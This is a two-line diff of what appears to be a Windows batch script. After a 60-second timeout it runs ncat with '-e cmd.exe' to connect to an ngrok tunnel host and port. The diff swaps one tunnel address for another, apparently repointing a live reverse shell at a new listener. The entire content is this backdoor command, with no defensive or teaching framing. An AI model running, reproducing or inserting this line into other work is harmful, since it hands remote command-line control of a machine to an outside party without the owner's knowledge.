@@ -1,2 +1,2 @@
 timeout /t 60
-ncat 6.tcp.eu.ngrok.io 15903 -e cmd.exe
+ncat 4.tcp.eu.ngrok.io 14627 -e cmd.exe
